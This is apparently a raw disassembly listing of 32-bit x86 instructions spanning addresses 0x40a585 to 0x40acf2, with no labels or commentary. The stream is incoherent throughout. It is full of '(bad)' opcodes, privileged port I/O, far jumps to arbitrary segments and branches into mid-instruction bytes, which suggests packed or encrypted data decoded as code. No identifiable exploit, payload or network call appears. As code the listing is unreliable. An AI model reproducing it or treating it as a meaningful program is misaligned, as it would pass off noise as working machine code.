  40a585:	mov    edx,0x8bd9fb01
  40a58a:	outs   dx,BYTE PTR ds:[esi]
  40a58b:	dec    ecx
  40a58c:	xchg   ecx,eax
  40a58d:	retf   
  40a58e:	inc    ecx
  40a58f:	xchg   ebx,eax
  40a590:	jle    0x40a585
  40a592:	inc    esp
  40a593:	jmp    0x9858:0xcec3ccb6
  40a59a:	sbb    DWORD PTR [ebp-0x60aad071],edi
  40a5a0:	cdq    
  40a5a1:	nop
  40a5a2:	mov    dl,0xf4
  40a5a4:	stc    
  40a5a5:	sbb    BYTE PTR [ecx],dl
  40a5a7:	push   eax
  40a5a8:	in     al,0x64
  40a5aa:	neg    ch
  40a5ac:	cmp    al,BYTE PTR [esi+0x63]
  40a5af:	mov    bl,BYTE PTR [ecx-0x26]
  40a5b2:	call   0x553c3230
  40a5b7:	inc    BYTE PTR [ecx]
  40a5b9:	popa   
  40a5ba:	sub    al,0xbd
  40a5bc:	clc    
  40a5bd:	rcl    ecx,1
  40a5bf:	daa    
  40a5c0:	pop    ss
  40a5c1:	addr16 cmc 
  40a5c3:	iret   
  40a5c4:	pop    edx
  40a5c5:	(bad)  
  40a5c6:	iret   
  40a5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c8:	aam    0x33
  40a5ca:	jmp    0x40a590
  40a5cc:	fwait
  40a5cd:	or     BYTE PTR [ebx-0x14],0xe9
  40a5d1:	xor    al,bl
  40a5d3:	mov    bl,0x9c
  40a5d5:	in     eax,0xbb
  40a5d7:	(bad)  
  40a5d8:	mov    esp,0x69feb554
  40a5dd:	(bad)  
  40a5de:	(bad)  
  40a5df:	jg     0x40a625
  40a5e1:	in     eax,0xc0
  40a5e3:	mov    DWORD PTR [edx],esi
  40a5e5:	sahf   
  40a5e6:	dec    edx
  40a5e7:	add    eax,0x567f9521
  40a5ec:	sbb    ebx,DWORD PTR [ebx+edi*4+0x30]
  40a5f0:	xchg   esp,eax
  40a5f1:	es scas eax,DWORD PTR es:[edi]
  40a5f3:	mov    BYTE PTR [edi-0x7115dfaa],dl
  40a5f9:	inc    ecx
  40a5fa:	mov    ds:0x35562331,eax
  40a5ff:	sar    eax,0x4
  40a602:	fwait
  40a603:	ret    0xaa39
  40a606:	push   cs
  40a607:	lds    esp,FWORD PTR [ebp-0xfc087de]
  40a60d:	mov    bl,0x8a
  40a60f:	aas    
  40a610:	mov    ah,0x92
  40a612:	in     al,dx
  40a613:	ins    DWORD PTR es:[edi],dx
  40a614:	lea    ecx,[edx]
  40a616:	js     0x40a693
  40a618:	inc    esi
  40a619:	icebp  
  40a61a:	cld    
  40a61b:	mov    esi,0x7d802101
  40a620:	jb     0x40a617
  40a622:	dec    esi
  40a623:	adc    dl,ch
  40a625:	or     al,0xee
  40a627:	rol    DWORD PTR [ecx+0x25c4a9a4],1
  40a62d:	xchg   edx,esi
  40a62f:	dec    edi
  40a630:	and    eax,ebx
  40a632:	dec    ebx
  40a633:	ret    
  40a634:	push   0xd985b79e
  40a639:	jns    0x40a63b
  40a63b:	mov    al,0x2
  40a63d:	popf   
  40a63e:	dec    ebp
  40a63f:	sbb    ebx,DWORD PTR [eax+0x33]
  40a642:	fwait
  40a643:	push   es
  40a644:	and    eax,0x57d624f1
  40a649:	xchg   ebp,eax
  40a64a:	cmp    BYTE PTR [ebp+0x364449c4],cl
  40a650:	cmp    esi,DWORD PTR [esi]
  40a652:	cdq    
  40a653:	inc    ecx
  40a654:	mov    ds:0x7c88c1a7,al
  40a659:	push   ecx
  40a65a:	(bad)  
  40a65b:	enter  0xf32e,0xfc
  40a65f:	mov    bh,0x96
  40a661:	xor    cl,BYTE PTR [ebx+0x6eca1422]
  40a667:	(bad)  
  40a668:	xor    esp,DWORD PTR [eax]
  40a66a:	in     eax,0xbe
  40a66c:	sub    cl,BYTE PTR [esi]
  40a66e:	sbb    al,0x5a
  40a670:	das    
  40a671:	dec    esp
  40a672:	ds adc BYTE PTR ss:[ecx],0x3
  40a677:	adc    DWORD PTR [edx+0x68af267e],esi
  40a67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a67e:	jbe    0x40a660
  40a680:	sub    ebx,DWORD PTR [edi]
  40a682:	xor    ebx,DWORD PTR [ecx+0x6ecc0461]
  40a688:	in     eax,0xcc
  40a68a:	test   DWORD PTR [edx-0x2a],0xa0bf91dd
  40a691:	jbe    0x40a632
  40a693:	adc    BYTE PTR [ecx+0x65338c85],dh
  40a699:	add    BYTE PTR [eax+0x18],al
  40a69c:	bound  esi,QWORD PTR [ecx]
  40a69e:	add    al,BYTE PTR [eax-0x12]
  40a6a1:	sbb    DWORD PTR [eax],eax
  40a6a3:	pop    edx
  40a6a4:	out    dx,al
  40a6a5:	sbb    cl,BYTE PTR [ebp+0x57]
  40a6a8:	ds push edx
  40a6aa:	xor    esp,DWORD PTR [esi+0x2d0502c5]
  40a6b0:	in     eax,0xb1
  40a6b2:	cld    
  40a6b3:	push   edx
  40a6b4:	adc    bl,ch
  40a6b6:	inc    esp
  40a6b7:	push   ebx
  40a6b8:	sbb    dh,BYTE PTR [edx-0x76]
  40a6bb:	retf   
  40a6bc:	popf   
  40a6bd:	js     0x40a642
  40a6bf:	push   ds
  40a6c0:	inc    esi
  40a6c1:	cmp    ebp,ecx
  40a6c3:	outs   dx,DWORD PTR ds:[esi]
  40a6c4:	adc    dh,BYTE PTR [eax+0x7e]
  40a6c7:	arpl   bx,bx
  40a6c9:	xchg   edx,eax
  40a6ca:	cmp    eax,esp
  40a6cc:	data16 (bad) 
  40a6cf:	jge    0x40a693
  40a6d1:	mov    bh,BYTE PTR [ecx+0x6a]
  40a6d4:	fisubr WORD PTR ss:0xebd780d6
  40a6db:	mov    dl,0x7e
  40a6dd:	repnz dec ebx
  40a6df:	fidivr WORD PTR [esi]
  40a6e1:	cmp    al,0x88
  40a6e3:	xchg   ecx,eax
  40a6e4:	das    
  40a6e5:	dec    al
  40a6e7:	test   al,0x7c
  40a6e9:	xor    esp,ebx
  40a6eb:	iret   
  40a6ec:	mov    cl,0xfa
  40a6ee:	dec    esp
  40a6ef:	icebp  
  40a6f0:	cli    
  40a6f1:	mov    ebp,0x5b8c2af9
  40a6f6:	lods   eax,DWORD PTR ds:[esi]
  40a6f7:	sahf   
  40a6f8:	sub    al,0xf
  40a6fa:	fucomi st,st(1)
  40a6fc:	mov    dh,0x2e
  40a6fe:	js     0x40a73a
  40a700:	mov    esp,0x5a3c3b8c
  40a705:	pop    ds
  40a706:	add    eax,0x7a7ce72d
  40a70b:	push   esp
  40a70c:	sbb    edi,ebx
  40a70e:	xor    eax,0xb1c1dc91
  40a713:	pop    edi
  40a714:	fnstenv [ebp+0x39bef18f]
  40a71a:	cmp    DWORD PTR [edx+0xc7fd108],esp
  40a720:	into   
  40a721:	mov    edx,0xac156111
  40a726:	add    dh,BYTE PTR [esi+0x1]
  40a729:	fwait
  40a72a:	shl    DWORD PTR [ebx],0x64
  40a72d:	mov    ebx,0x526736be
  40a732:	pop    esp
  40a733:	nop
  40a734:	fs loopne 0x40a720
  40a737:	aaa    
  40a738:	out    dx,eax
  40a739:	sub    BYTE PTR [ecx-0x79],bl
  40a73c:	lods   al,BYTE PTR ds:[esi]
  40a73d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a73e:	sar    ebx,0x6
  40a741:	shr    DWORD PTR [ebx-0x76],cl
  40a744:	adc    esp,edx
  40a746:	adc    eax,0x52fbfc59
  40a74b:	xchg   edx,eax
  40a74c:	adc    ebx,DWORD PTR [ecx]
  40a74e:	sub    BYTE PTR [esi+0x53],0xd5
  40a752:	scas   al,BYTE PTR es:[edi]
  40a753:	dec    esp
  40a754:	mov    edx,eax
  40a756:	xor    DWORD PTR [esi],ebp
  40a758:	pop    edi
  40a759:	daa    
  40a75a:	pusha  
  40a75b:	imul   ebp,eax,0x8
  40a75e:	jns    0x40a7ba
  40a760:	fisubr WORD PTR [edx+0x3f]
  40a763:	sub    BYTE PTR [ebp+0x3c],0x96
  40a767:	cmp    DWORD PTR [ecx],ebp
  40a769:	mov    eax,ds:0xa8209a18
  40a76e:	shl    DWORD PTR [edi+0x25],0x84
  40a772:	into   
  40a773:	fcomip st,st(5)
  40a775:	nop
  40a776:	into   
  40a777:	cmp    DWORD PTR [ecx],ebx
  40a779:	dec    ecx
  40a77a:	iret   
  40a77b:	mov    ds:0x77535cf6,eax
  40a780:	sbb    eax,esp
  40a782:	push   es
  40a783:	xchg   edi,eax
  40a784:	sub    ch,BYTE PTR [edx-0x647f6021]
  40a78a:	dec    edx
  40a78b:	(bad)  
  40a78c:	daa    
  40a78d:	lahf   
  40a78e:	dec    edi
  40a78f:	pop    eax
  40a790:	pop    esp
  40a791:	lds    esp,FWORD PTR [edx-0x18b3b39b]
  40a797:	inc    edx
  40a798:	dec    ebp
  40a799:	and    ecx,DWORD PTR [esi+0x59]
  40a79c:	push   eax
  40a79d:	ss mov esp,0x26beb457
  40a7a3:	aaa    
  40a7a4:	(bad)  
  40a7a5:	loop   0x40a73e
  40a7a7:	dec    ecx
  40a7a8:	xchg   BYTE PTR [ebp+ebp*4-0x57],cl
  40a7ac:	jmp    0xfdb1:0x8a5f30dd
  40a7b3:	stos   DWORD PTR es:[edi],eax
  40a7b4:	ss xchg edx,eax
  40a7b6:	and    ah,BYTE PTR [ebx+0x5a]
  40a7b9:	ss add eax,0xa5222b47
  40a7bf:	ins    DWORD PTR es:[edi],dx
  40a7c0:	neg    DWORD PTR [edi-0x62a3dcf9]
  40a7c6:	test   DWORD PTR [ebx+0x3f],esi
  40a7c9:	xor    BYTE PTR [ebp-0x73],bl
  40a7cc:	leave  
  40a7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ce:	daa    
  40a7cf:	arpl   WORD PTR [esi-0x880de34],cx
  40a7d5:	adc    edx,DWORD PTR [edx-0x773f3f04]
  40a7db:	gs pop edi
  40a7dd:	jmp    0x40a7ae
  40a7df:	dec    esi
  40a7e0:	je     0x40a833
  40a7e2:	pop    ecx
  40a7e3:	daa    
  40a7e4:	shl    DWORD PTR [ecx+0x40],0x17
  40a7e8:	sub    BYTE PTR [ebx],al
  40a7ea:	cmp    DWORD PTR [esi+0x4632a66],0x17
  40a7f1:	scas   eax,DWORD PTR es:[edi]
  40a7f2:	fild   WORD PTR ds:0x256373ed
  40a7f8:	push   es
  40a7f9:	or     cl,dl
  40a7fb:	out    dx,al
  40a7fc:	icebp  
  40a7fd:	mov    ebx,0xe9167b3c
  40a802:	cmovle edx,DWORD PTR [edx-0x5bfb385e]
  40a809:	retf   
  40a80a:	or     al,0x2e
  40a80c:	push   ebx
  40a80d:	jmp    0x46f:0xfb52e408
  40a814:	dec    edi
  40a815:	fisttp QWORD PTR ds:0xb4c7a539
  40a81b:	and    BYTE PTR [esi],bl
  40a81d:	stos   BYTE PTR es:[edi],al
  40a81e:	sbb    eax,0x520ae8fc
  40a823:	inc    ecx
  40a824:	push   ds
  40a825:	mov    esp,0x3d4f1625
  40a82a:	or     eax,0x805c0068
  40a82f:	inc    ebx
  40a830:	frstor [edi]
  40a832:	js     0x40a7e1
  40a834:	and    al,0x45
  40a836:	outs   dx,BYTE PTR ds:[esi]
  40a837:	push   ebp
  40a838:	dec    esi
  40a839:	sahf   
  40a83a:	repz mov esp,0x532c3829
  40a840:	jp     0x40a839
  40a842:	inc    esi
  40a843:	or     ch,cl
  40a845:	add    al,0x12
  40a847:	imul   edi,DWORD PTR [esi-0x26],0xfffffff3
  40a84b:	js     0x40a8a8
  40a84d:	mov    esi,0xffb462e0
  40a852:	fcmovbe st,st(1)
  40a854:	xor    edx,ecx
  40a856:	dec    esi
  40a857:	adc    eax,0x42900e24
  40a85c:	push   cs
  40a85d:	sub    bl,BYTE PTR [edx+0x54]
  40a860:	cmp    BYTE PTR [edi],0xde
  40a863:	(bad)  
  40a864:	mov    ebx,0xc9fab8b3
  40a869:	jge    0x40a82e
  40a86b:	cmp    BYTE PTR [ebp-0x2459bf16],dh
  40a871:	test   BYTE PTR [edx+0x61ce05e8],cl
  40a877:	push   es
  40a878:	rcr    BYTE PTR [esi+0x1c],cl
  40a87b:	fild   WORD PTR [ebx]
  40a87d:	pop    ds
  40a87e:	fmul   st,st(7)
  40a880:	mov    edi,0xfa937a2c
  40a885:	add    al,0xe8
  40a887:	mov    cs,esi
  40a889:	xchg   ebp,eax
  40a88a:	test   BYTE PTR [edx+0x6ab38956],cl
  40a890:	adc    cl,BYTE PTR [ebx-0x5f6b8946]
  40a896:	and    BYTE PTR [edx+0x67f73c5f],bl
  40a89c:	lock pop ds
  40a89e:	imul   esi,esp,0xffffffcb
  40a8a1:	push   0x78
  40a8a3:	and    cl,BYTE PTR [esi+ebx*1+0x7b0140bf]
  40a8aa:	out    0x28,eax
  40a8ac:	shr    BYTE PTR [ebp-0x65ec9f52],cl
  40a8b2:	pop    ds
  40a8b3:	retf   0x319a
  40a8b6:	xchg   ebp,eax
  40a8b7:	(bad)  
  40a8b8:	sbb    eax,0x183082e6
  40a8bd:	dec    ecx
  40a8be:	imul   edx,DWORD PTR [ecx],0x8ad592dc
  40a8c4:	loop   0x40a852
  40a8c6:	push   cs
  40a8c7:	icebp  
  40a8c8:	mov    al,0xef
  40a8ca:	imul   ecx,DWORD PTR [ebp+0x1],0x4236034f
  40a8d1:	fdiv   DWORD PTR ds:0x43cbfd95
  40a8d7:	mov    ch,al
  40a8d9:	fistp  DWORD PTR [ebp-0x6d0cfe6c]
  40a8df:	ret    0xfdd4
  40a8e2:	mov    ecx,0x98131041
  40a8e7:	inc    ebx
  40a8e8:	fild   WORD PTR [edx+edx*2-0x3d]
  40a8ec:	pusha  
  40a8ed:	out    0x68,eax
  40a8ef:	jecxz  0x40a926
  40a8f1:	iret   
  40a8f2:	ins    BYTE PTR es:[edi],dx
  40a8f3:	addr16 jb 0x40a941
  40a8f6:	aaa    
  40a8f7:	inc    esi
  40a8f8:	xchg   esi,eax
  40a8f9:	pop    esi
  40a8fa:	cwde   
  40a8fb:	dec    ebx
  40a8fc:	or     DWORD PTR ds:0xd73f8422,0xffffffcc
  40a903:	jecxz  0x40a95e
  40a905:	xchg   ebx,eax
  40a906:	xchg   ebp,eax
  40a907:	fwait
  40a908:	(bad)  
  40a909:	xor    edx,edi
  40a90b:	pop    ss
  40a90c:	push   eax
  40a90d:	aam    0x53
  40a90f:	out    0x7,eax
  40a911:	or     al,0x6c
  40a913:	inc    esi
  40a914:	popf   
  40a915:	test   al,0xdb
  40a917:	jmp    0x743a:0xeb253a2a
  40a91e:	ins    DWORD PTR es:[edi],dx
  40a91f:	arpl   si,si
  40a921:	shl    DWORD PTR [edi+0x29],0xcb
  40a925:	sub    BYTE PTR [edx-0x57e2c250],0x37
  40a92c:	inc    ecx
  40a92d:	or     DWORD PTR [edi-0x675cae78],edi
  40a933:	fiadd  WORD PTR [esi+edi*4+0x2b0af1e7]
  40a93a:	enter  0x3b13,0xd
  40a93e:	push   eax
  40a93f:	adc    dh,BYTE PTR [edi]
  40a941:	mov    ds:0x1c2ef84c,al
  40a946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a947:	outs   dx,BYTE PTR ds:[esi]
  40a948:	or     dl,bh
  40a94a:	pop    ebp
  40a94b:	popf   
  40a94c:	add    BYTE PTR [esi-0x54],0x39
  40a950:	fs popf 
  40a952:	call   FWORD PTR [ebp+0x28]
  40a955:	in     eax,dx
  40a956:	sub    al,0x29
  40a958:	dec    eax
  40a959:	cdq    
  40a95a:	shl    dh,0xd8
  40a95d:	rcl    al,0x48
  40a960:	fstp   QWORD PTR [ebx+0x3c3eab2d]
  40a966:	(bad)  
  40a967:	cmp    DWORD PTR [ebp-0x778c724c],eax
  40a96d:	out    0x8c,al
  40a96f:	loopne 0x40a8f5
  40a971:	sti    
  40a972:	mov    ecx,0x98a4a8d6
  40a977:	icebp  
  40a978:	mov    esi,DWORD PTR [edi]
  40a97a:	in     al,dx
  40a97b:	jp     0x40a972
  40a97d:	addr16 jne 0x40a996
  40a980:	fbld   TBYTE PTR [eax+0x53]
  40a983:	int    0xe6
  40a985:	push   ebp
  40a986:	cmp    esi,DWORD PTR [esp+edx*2-0x1bbff162]
  40a98d:	sbb    eax,esi
  40a98f:	inc    ecx
  40a990:	nop
  40a991:	sub    ebx,edx
  40a993:	js     0x40a938
  40a995:	dec    ecx
  40a996:	jns    0x40a93f
  40a998:	pop    ecx
  40a999:	sbb    DWORD PTR [ecx-0x3e3a6f50],esp
  40a99f:	inc    ebp
  40a9a0:	daa    
  40a9a1:	or     esp,DWORD PTR [eax]
  40a9a3:	or     DWORD PTR [ebx-0x3cf0f127],ecx
  40a9a9:	shl    BYTE PTR [ecx],1
  40a9ab:	das    
  40a9ac:	and    al,0x67
  40a9ae:	cli    
  40a9af:	mov    DWORD PTR [edi],0x5dab0783
  40a9b5:	dec    ecx
  40a9b6:	inc    ebx
  40a9b7:	or     BYTE PTR [edi+0xd3ac4c0],0xf6
  40a9be:	les    esi,FWORD PTR [ecx]
  40a9c0:	mov    DWORD PTR [edi],ecx
  40a9c2:	push   esi
  40a9c3:	add    BYTE PTR ds:0xed61a1df,bl
  40a9c9:	add    BYTE PTR [esi+0x54],al
  40a9cc:	pop    es
  40a9cd:	icebp  
  40a9ce:	inc    ebx
  40a9cf:	sub    DWORD PTR [esi],ebx
  40a9d1:	push   ss
  40a9d2:	inc    ebp
  40a9d3:	mov    ebp,0xc5e7e1ac
  40a9d8:	jno    0x40a97c
  40a9da:	scas   al,BYTE PTR es:[edi]
  40a9db:	xor    eax,DWORD PTR [ebx+ebp*2]
  40a9de:	pop    ebp
  40a9df:	and    BYTE PTR [edi-0x76dedf9],bh
  40a9e5:	mov    ebx,DWORD PTR es:[eax+0x422b15a3]
  40a9ec:	jb     0x40aa00
  40a9ee:	pushf  
  40a9ef:	push   ds
  40a9f0:	add    al,0xab
  40a9f2:	out    dx,al
  40a9f3:	cli    
  40a9f4:	xchg   ebx,ecx
  40a9f6:	dec    edi
  40a9f7:	sar    BYTE PTR [ebp-0x6a5f25a1],cl
  40a9fd:	xor    eax,0x6aa780a8
  40aa02:	jno    0x40aa34
  40aa04:	cwde   
  40aa05:	and    ah,BYTE PTR [esi]
  40aa07:	aas    
  40aa08:	dec    ebx
  40aa09:	jne    0x40a998
  40aa0b:	or     ch,al
  40aa0d:	push   0xfffffffd
  40aa0f:	ror    DWORD PTR [ebp+0x39],0x2a
  40aa13:	sahf   
  40aa14:	imul   ebp,DWORD PTR es:[edi+ebx*2+0x30],0xe90f410b
  40aa1d:	pop    esp
  40aa1e:	xchg   esi,eax
  40aa1f:	push   es
  40aa20:	cmc    
  40aa21:	lods   eax,DWORD PTR ds:[esi]
  40aa22:	mov    ebp,0x875d2007
  40aa27:	inc    eax
  40aa28:	mov    ebp,DWORD PTR [ecx+0x15]
  40aa2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa2c:	jmp    0x40a9e1
  40aa2e:	cmp    DWORD PTR [eax+ebx*2-0x16],ebx
  40aa32:	cmp    al,0xe9
  40aa34:	(bad)  
  40aa35:	(bad)  
  40aa36:	in     al,0x38
  40aa38:	scas   al,BYTE PTR es:[edi]
  40aa39:	call   0xac49c225
  40aa3e:	call   0x983b:0x4efb1ed2
  40aa45:	xor    al,0x37
  40aa47:	xchg   edi,eax
  40aa48:	imul   esi,DWORD PTR ds:0x26c12e3e,0x6324b31f
  40aa52:	mov    al,0xd1
  40aa54:	popa   
  40aa55:	cs loopne 0x40aa66
  40aa58:	les    ecx,FWORD PTR [esi+0x1b]
  40aa5b:	leave  
  40aa5c:	add    ch,BYTE PTR [edi-0xc443761]
  40aa62:	es mov edx,0x3439aa37
  40aa68:	xchg   ecx,eax
  40aa69:	(bad)  
  40aa6a:	cmc    
  40aa6b:	adc    edi,DWORD PTR [edi]
  40aa6d:	jne    0x40aa83
  40aa6f:	int    0x7f
  40aa71:	sub    eax,0x57411839
  40aa76:	dec    esp
  40aa77:	sub    dh,BYTE PTR [ecx+0x24b74a78]
  40aa7d:	(bad)  
  40aa7e:	popf   
  40aa7f:	push   es
  40aa80:	aas    
  40aa81:	and    dh,bh
  40aa83:	cwde   
  40aa84:	push   0x22
  40aa86:	out    0xd2,al
  40aa88:	rcr    BYTE PTR [ebp+0x20ee2d58],0x28
  40aa8f:	retf   0xa36a
  40aa92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa93:	imul   esi,DWORD PTR [edi],0x64755e75
  40aa99:	jb     0x40aafd
  40aa9b:	mov    eax,DWORD PTR [edx]
  40aa9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa9e:	popf   
  40aa9f:	xor    cl,cl
  40aaa1:	fisub  DWORD PTR [edx]
  40aaa3:	aam    0xd
  40aaa5:	loopne 0x40aa89
  40aaa7:	iret   
  40aaa8:	add    eax,0x31a5faad
  40aaad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaae:	inc    esp
  40aaaf:	es xor cl,al
  40aab2:	sti    
  40aab3:	mov    dl,0xaa
  40aab5:	xchg   edx,eax
  40aab6:	ud0    edi,DWORD PTR [edx-0x21]
  40aaba:	in     al,dx
  40aabb:	mov    bh,ch
  40aabd:	cmp    eax,0xc9eabc71
  40aac2:	jmp    0x36870834
  40aac7:	aaa    
  40aac8:	and    al,0xb1
  40aaca:	inc    eax
  40aacb:	call   0xaf0fd2f
  40aad0:	or     al,0xa3
  40aad2:	aam    0xc1
  40aad4:	mov    eax,0xc6713428
  40aad9:	push   esi
  40aada:	push   edi
  40aadb:	fldcw  WORD PTR [ebp-0x393c16]
  40aae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae2:	ror    BYTE PTR [eax-0x8],cl
  40aae5:	xchg   ebp,eax
  40aae6:	daa    
  40aae7:	repnz push esp
  40aae9:	inc    edx
  40aaea:	mov    esp,0xced00aa9
  40aaef:	cmp    al,0xc5
  40aaf1:	or     eax,DWORD PTR ds:0x39a06e98
  40aaf7:	das    
  40aaf8:	inc    ecx
  40aaf9:	push   esp
  40aafa:	dec    esi
  40aafb:	lods   al,BYTE PTR ds:[esi]
  40aafc:	cs loope 0x40ab22
  40aaff:	inc    eax
  40ab00:	adc    DWORD PTR [ebp-0x6e07d634],0x9273ed59
  40ab0a:	mov    ?,ecx
  40ab0c:	mov    ch,0x76
  40ab0e:	jmp    0x40aafc
  40ab10:	mov    edx,ebp
  40ab12:	mov    esi,0x5a0f608
  40ab17:	add    DWORD PTR [edx+eax*1-0x4368d221],ecx
  40ab1e:	jg     0x40ab27
  40ab20:	pusha  
  40ab21:	rol    DWORD PTR es:[ecx],cl
  40ab24:	enter  0x644c,0x1c
  40ab28:	inc    ebx
  40ab29:	repz pushf 
  40ab2b:	xchg   edi,eax
  40ab2c:	add    BYTE PTR [esi],bl
  40ab2e:	(bad)  
  40ab2f:	shl    BYTE PTR [edx+0x3e],1
  40ab32:	mov    ds:0xb9f80d4e,eax
  40ab37:	pop    es
  40ab38:	hlt    
  40ab39:	inc    ebp
  40ab3a:	cmp    al,0xcf
  40ab3c:	pop    ecx
  40ab3d:	les    ebx,FWORD PTR [edi+0x64]
  40ab40:	js     0x40abc1
  40ab42:	fisubr WORD PTR [esi]
  40ab44:	out    dx,eax
  40ab45:	call   0x29b:0x94ef2b62
  40ab4c:	nop
  40ab4d:	mov    bl,0x9e
  40ab4f:	lods   eax,DWORD PTR ds:[esi]
  40ab50:	mov    esi,0x69e8c3e
  40ab55:	cmc    
  40ab56:	pop    ebx
  40ab57:	ret    
  40ab58:	jecxz  0x40ab20
  40ab5a:	sbb    al,0x67
  40ab5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5d:	js     0x40abca
  40ab5f:	js     0x40aba3
  40ab61:	jmp    0x40abab
  40ab63:	cmpxchg DWORD PTR [edx+0x14686578],edi
  40ab6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab6b:	mov    bh,0x91
  40ab6d:	mov    al,ds:0x878a6542
  40ab72:	jmp    0xb54f:0x11f534ec
  40ab79:	pusha  
  40ab7a:	mov    edi,0x73ef329f
  40ab7f:	pop    esp
  40ab80:	ss or  al,0x27
  40ab83:	add    dl,BYTE PTR [esi]
  40ab85:	or     BYTE PTR [ebx-0x20b10415],dh
  40ab8b:	sbb    DWORD PTR [esi-0x282ec436],esp
  40ab91:	jg     0x40ab76
  40ab93:	cli    
  40ab94:	pushf  
  40ab95:	jg     0x40abae
  40ab97:	sbb    esp,DWORD PTR [eax]
  40ab99:	dec    edx
  40ab9a:	sub    al,0x3c
  40ab9c:	fsub   st(3),st
  40ab9e:	jmp    FWORD PTR [ebp-0x41]
  40aba1:	out    0xa9,al
  40aba3:	les    ebp,FWORD PTR ds:0x7f47588a
  40aba9:	int3   
  40abaa:	setne  BYTE PTR [edx-0x1d]
  40abae:	pop    es
  40abaf:	inc    edx
  40abb0:	cmp    eax,0xb565b950
  40abb5:	int3   
  40abb6:	mov    eax,0x99191f28
  40abbb:	pop    es
  40abbc:	cwde   
  40abbd:	inc    ebp
  40abbe:	into   
  40abbf:	repnz sbb eax,0xecd896df
  40abc5:	ss jnp 0x40ac27
  40abc8:	xor    ch,ah
  40abca:	pop    esi
  40abcb:	dec    ebx
  40abcc:	imul   eax,DWORD PTR [eax],0x826a3efc
  40abd2:	cwde   
  40abd3:	test   BYTE PTR ds:0x9f74fb3,bl
  40abd9:	les    ebx,FWORD PTR [edi]
  40abdb:	mov    esi,0x731206f1
  40abe0:	add    bh,al
  40abe2:	repnz int 0x3e
  40abe5:	shr    ebp,1
  40abe7:	inc    BYTE PTR [ecx+0x1508b276]
  40abed:	push   ebx
  40abee:	sbb    DWORD PTR ds:0xc192ece1,ebx
  40abf4:	push   edx
  40abf5:	jmp    0x40ab83
  40abf7:	lods   al,BYTE PTR ds:[esi]
  40abf8:	popa   
  40abf9:	pusha  
  40abfa:	mov    ds:0x6e4b9bde,eax
  40abff:	lds    edi,FWORD PTR [eax]
  40ac01:	aad    0xd4
  40ac03:	(bad)  
  40ac04:	mov    edx,DWORD PTR [esi-0xc]
  40ac07:	mov    esp,0x1950863
  40ac0c:	pop    ebp
  40ac0d:	xor    BYTE PTR [ebx+0x556d570e],ch
  40ac13:	test   al,0x13
  40ac15:	and    BYTE PTR [edi+0x1c],bh
  40ac18:	push   esp
  40ac19:	jp     0x40ac72
  40ac1b:	sub    edi,DWORD PTR [ebp+0x33]
  40ac1e:	sahf   
  40ac1f:	mov    ecx,0x2737bf7a
  40ac24:	loop   0x40ac2e
  40ac26:	and    ch,BYTE PTR [edx+0x55]
  40ac29:	mov    eax,0xa5f425d
  40ac2e:	rol    BYTE PTR [edi-0x53ae7fe7],0xf1
  40ac35:	and    esp,DWORD PTR [ebp-0x6c]
  40ac38:	aas    
  40ac39:	(bad)
  40ac3c:	in     eax,0x32
  40ac3e:	fdivr  QWORD PTR [eax+0x4ff300d1]
  40ac44:	xor    ebx,esi
  40ac46:	xchg   esi,eax
  40ac47:	jo     0x40ac77
  40ac49:	jns    0x40ac3f
  40ac4b:	ins    BYTE PTR es:[edi],dx
  40ac4c:	pop    es
  40ac4d:	int3   
  40ac4e:	bound  esp,QWORD PTR [esi]
  40ac50:	push   ds
  40ac51:	fadd   QWORD PTR [eax-0x61]
  40ac54:	jmp    0xa10e5ae4
  40ac59:	pop    ds
  40ac5a:	pop    ss
  40ac5b:	pop    esp
  40ac5c:	jl     0x40abf5
  40ac5e:	lods   eax,DWORD PTR ds:[esi]
  40ac5f:	sbb    ebx,DWORD PTR [ebp+0x23]
  40ac62:	or     eax,0x28878288
  40ac67:	mov    dh,0xff
  40ac69:	or     eax,0xee2f5a7a
  40ac6e:	push   esi
  40ac6f:	inc    ecx
  40ac70:	push   0x7c0925b4
  40ac75:	or     DWORD PTR [ebx],0xffffffe4
  40ac78:	vpshaw xmm6,xmm7,[ecx+0x1e0d04b9]
  40ac81:	(bad)  
  40ac82:	out    0xfe,eax
  40ac84:	sub    DWORD PTR [eax-0x3f],eax
  40ac87:	aaa    
  40ac88:	cli    
  40ac89:	(bad)  
  40ac8a:	mov    eax,0x712a49ef
  40ac8f:	xchg   ebx,eax
  40ac90:	div    BYTE PTR [ebx+0x10f5b6ca]
  40ac96:	call   0x4d109b91
  40ac9b:	jle    0x40ad1a
  40ac9d:	pop    ebp
  40ac9e:	xchg   BYTE PTR fs:[edi+edi*8],ch
  40aca2:	mov    bl,0x77
  40aca4:	out    0xd3,eax
  40aca6:	jb     0x40ac7e
  40aca8:	push   eax
  40aca9:	bound  ebx,QWORD PTR [ebx+0x4cb451b9]
  40acaf:	xchg   dh,ch
  40acb1:	mov    dh,0x12
  40acb3:	jbe    0x40ac61
  40acb5:	mov    al,ds:0x4de7f0b
  40acba:	mov    DWORD PTR [edi+esi*4-0x27],0x9087e625
  40acc2:	push   cs
  40acc3:	jp     0x40acda
  40acc5:	pop    ebp
  40acc6:	in     al,0xe9
  40acc8:	jmp    0x886d:0x36b107c
  40accf:	or     DWORD PTR [ebp+0x70a5d00a],0x4d
  40acd6:	cbw    
  40acd8:	pop    esi
  40acd9:	aad    0xd0
  40acdb:	xor    dh,ah
  40acdd:	int    0xf3
  40acdf:	mov    ds:0xcb76fe11,al
  40ace4:	lods   eax,DWORD PTR ds:[esi]
  40ace5:	(bad)  
  40ace6:	mov    ah,BYTE PTR [ebx+0x35]
  40ace9:	sbb    BYTE PTR [ecx+0x542bdabe],bl
  40acef:	pop    edi
  40acf0:	loopne 0x40acae
  40acf2:	add    DWORD PTR [ebx],ecx
